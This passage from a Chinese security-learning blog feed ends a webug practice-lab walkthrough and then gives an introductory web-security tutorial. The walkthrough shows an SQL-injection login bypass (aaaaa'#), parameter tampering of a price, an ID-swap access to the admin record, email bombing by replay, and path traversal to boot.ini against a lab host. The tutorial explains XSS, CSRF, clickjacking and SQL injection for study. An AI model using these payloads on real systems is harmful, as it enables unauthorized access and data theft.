class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 直接抓包即可看到，在url链接中也可以看到</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;auth_cross&#x2F;cross_permission_pay.php?price&#x3D;100</span><br><span class="line">我们可以将价格进行随意修改</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="12-邮箱轰炸"><a href="#12-邮箱轰炸" class="headerlink" title="12 邮箱轰炸"></a>12 邮箱轰炸</h1><ol><li>抓包分析：post数据中只有username=a@qq.com</li><li>使用burpsuite进行抓包重放攻击</li><li>参考 <a href="http://www.sohu.com/a/322105042_120136504">http://www.sohu.com/a/322105042_120136504</a></li></ol><h1 id="13-越权查看admin"><a href="#13-越权查看admin" class="headerlink" title="13 越权查看admin"></a>13 越权查看admin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 用户中存在aaaaa，我们用其进行登陆，由于不知道密码，我们尝试使用万能密码进行构造</span><br><span class="line">2. aaaaa’# &#x2F;密码任意，登陆成功</span><br><span class="line">3. http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;auth_cross&#x2F;cross_find2.php?id&#x3D;2</span><br><span class="line">4. 我们将id修改为1，此时显示的即为admin的信息</span><br><span class="line">http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;auth_cross&#x2F;cross_find2.php?id&#x3D;1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="14-URL跳转"><a href="#14-URL跳转" class="headerlink" title="14 URL跳转"></a>14 URL跳转</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先页面url：  http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;more&#x2F;url_redirect.php</span><br><span class="line">在页面中找到url跳转的，百度：</span><br><span class="line"> 修改其信息实现任意跳转</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="15-文件包含漏洞"><a href="#15-文件包含漏洞" class="headerlink" title="15 文件包含漏洞"></a>15 文件包含漏洞</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">打开后url： http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;more&#x2F;file_include.php?filename&#x3D;..&#x2F;..&#x2F;template&#x2F;dom_xss.html</span><br><span class="line">读取boot.ini文件  http:&#x2F;&#x2F;192.168.80.136&#x2F;control&#x2F;more&#x2F;file_include.php?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini</span><br><span class="line"></span><br><span class="line">相关知识可参考：  https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;182280.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="16-webshell爆破"><a href="#16-webshell爆破" class="headerlink" title="16 webshell爆破"></a>16 webshell爆破</h1>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webug靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全入门</title>
      <link href="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
      <url>/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<h1 id="1web安全初始阶段"><a href="#1web安全初始阶段" class="headerlink" title="1web安全初始阶段"></a>1web安全初始阶段</h1><a id="more"></a><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747196481.png" alt="1569747196481">1 web基础知识</p><h2 id="1-web简介"><a href="#1-web简介" class="headerlink" title="1 web简介"></a>1 web简介</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569635618823.png" alt="1569635618823"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569635754832.png" alt="1569635754832"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569635797672.png" alt="1569635797672"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569636336218.png" alt="1569636336218"></p><p><strong>浏览器工作流程</strong></p><p><strong><a href="http://www.anquanquan.info/">www.anquanquan.info</a></strong></p><p><strong>学习安排</strong></p><p>《中国黑客传说：游走在黑暗中的精灵》</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569638737643.png" alt="1569638737643"></p><p>web安全比二进制安全容易入手</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639325599.png" alt="1569639325599"></p><p>安全知识比较杂</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639428753.png" alt="1569639428753"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639561697.png" alt="1569639561697"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639636417.png" alt="1569639636417"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639710350.png" alt="1569639710350"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639680856.png" alt="1569639680856"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639816030.png" alt="1569639816030">    </p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639916339.png" alt="1569639916339"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569640294559.png" alt="1569640294559"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569640326199.png" alt="1569640326199"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569640452565.png" alt="1569640452565"></p><p>火绒</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569652174332.png" alt="1569652174332"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569653326706.png" alt="1569653326706"></p><h2 id="2-web通信"><a href="#2-web通信" class="headerlink" title="2 web通信"></a>2 web通信</h2><p><strong>URL</strong>：同一资源定位符 uniform resource locator</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660448212.png" alt="1569660448212"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660488155.png" alt="1569660488155"></p><p><strong>HTTP</strong>：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660590186.png" alt="1569660590186"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660628232.png" alt="1569660628232"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660701822.png" alt="1569660701822"></p><p><strong>referer：</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660778304.png" alt="1569660778304"></p><p><strong>cookie和set-cookie</strong>：</p><h2 id="3-web开发"><a href="#3-web开发" class="headerlink" title="3 web开发"></a>3 web开发</h2><h3 id="1-HTML"><a href="#1-HTML" class="headerlink" title="1  HTML"></a>1  HTML</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662110503.png" alt="1569662110503"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662286401.png" alt="1569662286401"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662371019.png" alt="1569662371019"></p><p>语法</p><p>HTML DOM</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662498152.png" alt="1569662498152"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662533575.png" alt="1569662533575"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662548836.png" alt="1569662548836"></p><h3 id="2-JavaScript"><a href="#2-JavaScript" class="headerlink" title="2  JavaScript"></a>2  JavaScript</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662649645.png" alt="1569662649645"></p><p><strong>在哪些地方可以运行js？</strong></p><ul><li>HTML的<code>&lt;script&gt;&lt;/script&gt;</code>之间</li><li>HTML的事件属性中，如onclick</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662760122.png" alt="1569662760122"></p><ul><li>浏览器的js控制台</li></ul><p>js语法借用了c、java的语法</p><p><strong>js的功能</strong>：</p><ul><li><p>动态效果</p></li><li><p><strong>JavaScript  HTML DOM</strong>：在页面中操作HTML</p></li></ul><p><strong>获取内容</strong>：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662953308.png" alt="1569662953308"></p><p><strong>修改内容</strong>：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663126720.png" alt="1569663126720"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663134317.png" alt="1569663134317"></p><p><strong>动态创建HTML元素内容</strong>:<code>document.write()</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663406720.png" alt="1569663406720"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663434710.png" alt="1569663434710"></p><p><strong>页面增加点互动</strong>：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663736654.png" alt="1569663736654"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663757057.png" alt="1569663757057"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663770538.png" alt="1569663770538"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663836725.png" alt="1569663836725"></p><ul><li><strong>JavaScript  BOM：</strong></li></ul><p>如果我们想获取浏览器的信息，<strong>操作浏览器</strong>行为怎么办？</p><p>如何让浏览器来<strong>警告</strong>用户？</p><ol><li>警告弹窗alert（）</li><li>确认弹窗confirm（）</li><li>提示弹窗prompt（）</li></ol><p>如何从浏览器获取<strong>用户cookie</strong>？</p><ol><li>cookie：通常是服务器发放给用户客户端的一小段<strong>文本信息</strong></li><li>常见场景：用户输入用户名和密码成功登陆网站后，网站会生成一个cookie给用户，当做<strong>用户凭证</strong></li><li>这个凭证cookie相当于我们的钥匙，我们每次访问网站的时候浏览器都会带上<strong>钥匙（cookie）</strong></li></ol><p><strong>获取</strong>：<code>document.cookie</code></p><p><strong>写入</strong>：<code>document.cookie = &quot;写入值&quot;</code></p><ul><li>其他浏览器获取和操作行为：<ul><li>获取浏览器屏幕信息：<code>(window.)screen</code></li><li>获取/控制用户页面url：(window.)location</li><li>获取访问者浏览器信息：<code>(window.)navigator</code></li><li>操作浏览器窗口：window open,close</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569667911811.png" alt="1569667911811"></p><h3 id="3-web服务端环境"><a href="#3-web服务端环境" class="headerlink" title="3 web服务端环境"></a>3 web服务端环境</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669186397.png" alt="1569669186397"></p><p>目前流行的架构：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669250661.png" alt="1569669250661"></p><p>如何搭建一个web服务器？</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669600164.png" alt="1569669600164"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669646377.png" alt="1569669646377"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569670935474.png" alt="1569670935474"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569671104066.png" alt="1569671104066"></p><p>文件放在哪里？</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569671146376.png" alt="1569671146376"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672289403.png" alt="1569672289403"></p><h3 id="4-SQL"><a href="#4-SQL" class="headerlink" title="4 SQL"></a>4 SQL</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672457230.png" alt="1569672457230"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672483451.png" alt="1569672483451"></p><p><strong>数据库搭建</strong>：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672512008.png" alt="1569672512008"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672553314.png" alt="1569672553314"></p><p><strong>数据库操作：</strong></p><ul><li>创建：CREATE DATABASE websecurity；</li><li>查看：SHOW databases；</li><li>切换：USE websecurity；</li><li>删除：DROP DATABASE websecurity；</li><li>tips：SQL语句对大小写不敏感，分号作为语句的结束，程序中会自动补充</li></ul><p><strong>数据表操作</strong>:</p><ul><li><p>创建：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569673088341.png" alt="1569673088341"></p></li><li><p>查看：SHOW tables；</p></li><li><p>插入：</p></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569673131856.png" alt="1569673131856"></p><ul><li><p>查询：SELECT * from teacher</p></li><li><p>order by  、where、union/union all(这个可让重复的全部显示)</p></li><li><p>注释：#  或 –  （双横杠有一个空格） 或 /* …*/</p></li><li><p>常见的内置函数：dababase（）、current_user、load_file()</p></li><li><p>tips：version（）数据库版本、into+outfile写入文件</p></li></ul><h3 id="5-php"><a href="#5-php" class="headerlink" title="5  php"></a>5  php</h3><p>.php文件在服务器处理</p><p><strong>基本组成</strong>：</p><ul><li><p>串接：.(点)</p></li><li><p>脚本范围：<code>&lt;?php  ?&gt;</code></p></li><li><p>注释： //、#、/**/</p></li><li><p>echo和print</p><ul><li>echo语句，一次输出多个</li><li>print为函数，有返回值</li></ul></li></ul><p>  <img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679401513.png" alt="1569679401513"></p><ul><li>tips：除了<code>$_POST、$_GET</code>接受传值外，还可以用<code>$_REQUEST</code></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679584658.png" alt="1569679584658"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679607141.png" alt="1569679607141"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679647822.png" alt="1569679647822"></p><p><strong>数据库类</strong></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569681249027.png" alt="1569681249027"></p><h2 id="5-补充"><a href="#5-补充" class="headerlink" title="5 补充"></a>5 补充</h2><p>1 常见浏览器协议</p><h1 id="2-web安全"><a href="#2-web安全" class="headerlink" title="2 web安全"></a>2 web安全</h1><h3 id><a href="#" class="headerlink" title></a></h3><h2 id="1-常见的安全问题"><a href="#1-常见的安全问题" class="headerlink" title="1  常见的安全问题"></a>1  常见的安全问题</h2><ul><li><p>钓鱼：</p><ul><li><p>诱惑性标题</p></li><li><p>仿冒真实网站</p><p>骗取用户账号</p></li><li><p>骗取用户资料</p></li></ul></li><li><p>篡改网页：</p><ul><li>关键字：Hacked by</li><li>搜索引擎语法：<ul><li>Intitle：keyword 标题中含有关键字的网页</li><li>Intext：keyword 正文中含有关键字的网页</li><li>Site：domain在某个域名和子域名下的网页</li></ul></li></ul></li><li><p>暗链：</p><ul><li>隐藏在网站中链接</li><li>网游/博彩/色情/医疗</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569719637803.png" alt="1569719637803"></p><ul><li>webshell（常说的后门）：<ul><li>网页</li><li>功能强大</li><li>asp/php/jsp</li><li>后门程序</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569719699554.png" alt="1569719699554"></p><p>总结：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569719806261.png" alt="1569719806261"></p><h2 id="2-常见web漏洞解析"><a href="#2-常见web漏洞解析" class="headerlink" title="2 常见web漏洞解析"></a>2 常见web漏洞解析</h2><h3 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1 XSS"></a>1 XSS</h3><p>全称：Cross Site Script</p><p>中文：跨站脚本</p><p>危害：盗取用户信息、钓鱼、制造蠕虫等</p><p>概念：黑客通过“HTML注入”篡改页面，<strong>插入恶意脚本</strong>，当用户在浏览网页时，实现控制用户浏览器行为的一种攻击方式</p><p>实例讲解：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569720183819.png" alt="1569720183819"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569720204208.png" alt="1569720204208"></p><h4 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h4><ul><li><p>存储型：访问网站，触发XSS</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721684458.png" alt="1569721684458"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721715710.png" alt="1569721715710"></p><p>可以看到存储型是要<strong>写入到数据库中的</strong></p></li><li><p>反射型：访问携带XSS脚本的链接，触发xss</p><ul><li>原理解析：获取参数后，直接输出到客户端，导致XSS</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721779487.png" alt="1569721779487"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721866615.png" alt="1569721866615"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569723129034.png" alt="1569723129034"></p><p>执行过程：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569722028129.png" alt="1569722028129"></p><p>存储型与反射型进行区别：存储型进行两次且需要数据库，而反射型只需要浏览器</p><ul><li>DOM型：访问携带xss脚本的链接，触发xss</li><li>反射型和DOM型的<strong>区别</strong>：<ul><li>DOM型xss是通过<strong>前端JavaScript</strong>，将xss脚本写入到DOM中，触发xss；</li><li>而反射型xss是通过<strong>后端web程序</strong>，将xss脚本写入到响应页面中，浏览器响应页面时才触发xss</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569722497761.png" alt="1569722497761"></p><p>总结：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569725124362.png" alt="1569725124362"></p><h3 id="2-CSRF"><a href="#2-CSRF" class="headerlink" title="2 CSRF"></a>2 CSRF</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569725841217.png" alt="1569725841217"></p><p>全称：Cross-site request forgery</p><p>中文名称：跨站请求伪造</p><p>概念：利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作</p><p>危害：</p><ul><li><p>执行恶意操作（“被转账”、“被发垃圾评论”等）</p></li><li><p>制造蠕虫</p></li><li><p>。。。。。</p></li><li><p>原理分析</p></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726085354.png" alt="1569726085354"></p><p>转账页面</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726110660.png" alt="1569726110660"></p><p>抓包了解背后的请求</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726191651.png" alt="1569726191651"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726265064.png" alt="1569726265064"></p><h3 id="3-点击劫持"><a href="#3-点击劫持" class="headerlink" title="3 点击劫持"></a>3 点击劫持</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727112662.png" alt="1569727112662"></p><p>使用<code>iframe</code></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727206062.png" alt="1569727206062"></p><p>实例讲解</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727706208.png" alt="1569727706208"></p><p>点击按钮后</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727727210.png" alt="1569727727210"></p><ul><li>原理分析：<ul><li>隐蔽性较高</li><li>骗取用户操作</li><li>‘UI-覆盖攻击’</li><li>利用iframe或其他标签的属性</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727846185.png" alt="1569727846185"></p><h3 id="4-URL跳转"><a href="#4-URL跳转" class="headerlink" title="4 URL跳转"></a>4 URL跳转</h3><ul><li><p>定义：借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题</p></li><li><p>实现方式：</p><ul><li>Header头跳转</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737783451.png" alt="1569737783451"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737797248.png" alt="1569737797248"></p><ul><li>JavaScript跳转</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737819522.png" alt="1569737819522"></p><ul><li>META标签跳转</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737870744.png" alt="1569737870744"></p><ul><li>原理分析</li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737920980.png" alt="1569737920980"></p><h3 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5 SQL注入"></a>5 SQL注入</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738143465.png" alt="1569738143465"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738261499.png" alt="1569738261499"></p><ul><li>必备条件：<ul><li>可以控制输入的数据</li><li>服务器要执行的代码拼接了控制的数据</li></ul></li></ul><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738396126.png" alt="1569738396126"></p><p>SQL注入的<strong>本质</strong>：数据和代码未分离，即数据当做了代码来执行</p><p>危害：</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738551128.png" alt="1569738551128"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738565272.png" alt="1569738565272"></p><h1 id="3-Web安全工具"><a 